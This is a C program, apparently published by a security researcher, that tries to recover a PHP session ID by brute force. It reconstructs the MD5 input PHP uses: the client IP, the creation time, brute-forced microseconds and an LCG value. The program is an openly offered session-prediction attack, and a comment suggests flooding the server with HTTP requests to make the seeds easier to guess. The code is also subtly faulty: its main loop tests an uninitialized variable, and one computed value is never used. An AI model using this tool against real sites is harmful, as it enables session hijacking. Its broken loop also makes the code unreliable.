/*
 * To compile: gcc -std=c99 -lm -lcrypto time-lcg-session.c -o time-lcg-session
 *
 * This program will take way too long to help you. Consider
 * an FPGA implementation of this program to run in a (possibly)
 * reasonable amount of time.
 *
 * Given a session ID, IP and the time the session was created,
 * it attemps to find s1 and s2 (internal state of PHP's LCG).
 *
 * It brute forces s1 and s2 (down from 64 bits to 35), but also
 * brute forces sessions, which is another 20 bits.
 *
 * By getting the PID the session was created in, you can increase
 * the speed by 31,744 times. This still won't help you!
 *
 * However, if you get an lcg_value(), THEN you have something to
 * work off of. A PID and lcg_value() will retrieve the s1 and s2
 * in a matter of seconds (see s1s2.c). With just a PID, this
 * takes 2**21 seconds per round on an MBP.
 *
 * Good luck.
 *
 * -samy kamkar, code@samy.pl, 08/22/09
 */

// time ./time-session 72.37.252.206 1251248690 5 91cde0gh3jk4mn5pq6s7u8

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <math.h>
#include <sys/time.h>
#include <openssl/md5.h>

static char hexconvtab[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-";
static char *bin_to_readable(char *in, size_t inlen, char *out, char nbits)
{
	unsigned char *p, *q;
	unsigned short w;
	int mask;
	int have;

	p = (unsigned char *) in;
	q = (unsigned char *)in + inlen;

	w = 0;
	have = 0;
	mask = (1 << nbits) - 1;

	while (1) {
		if (have < nbits) {
			if (p < q) {
				w |= *p++ << have;
				have += 8;
			} else {
				/* consumed everything? */
				if (have == 0) break;
				/* No? We need a final round */
				have = nbits;
			}
		}

		/* consume nbits */
		*out++ = hexconvtab[w & mask];
		w >>= nbits;
		have -= nbits;
	}

	*out = '\0';
	return out;
}

int main(int argc, char** argv)
{
	char buf[512];
	unsigned char *md = malloc(18);
	char *p = malloc(34);

	if (argc != 5)
	{
		fprintf(stderr, "usage: %s <ip> <session start time> <bits per session byte [4|5|6]> <session id>\n", argv[0]);
		return -1;
	}

	double stime = strtod(argv[2], NULL);
	int bits = atoi(argv[3]);
	int i, j, k, l, usec;
	int exp216, start_j;
	double lcg;
	exp216 = exp2(15);
	start_j = 1024;

	/* get our time, we'll brute force 20 bits of this */
    struct timeval tv;
	gettimeofday(&tv, NULL);

	/* Number of rounds to test
	 * if it takes too long, i would send lots of http requests 
 	 * to the server until a new process spawns, thus producing
 	 * new seeds easier to produce */
	for (k = 1; k < 10000; k++)
	{
		printf("Testing for %d round of lcg_value()...\n", k);

		/* brute force lcg */
		for (lcg = 0.00000000; i < 10.00000000; lcg += 0.00000001)
		{
				printf("lcg=%0.8F\n", lcg);
				/* brute force usec from session */
				for (usec = 0; usec < 1000000; usec++)
				{
					sprintf(buf, "%.15s%ld%ld%0.8F", argv[1], (long int)stime, (long int)usec, lcg);
					MD5((unsigned char *)buf, strlen(buf), md);
					bin_to_readable((char *)md, MD5_DIGEST_LENGTH, p, bits);
					if (strcmp(argv[4], p) == 0)
					{
						printf("FOUND: p=%s buf=%s\nround=%d stime=%ld lcg=%0.8F usec=%ld\n",
							p, buf, k, (long int)stime, lcg, (long int)usec);
						return 0;
					}
				}
		}
	}

	return 0;
}

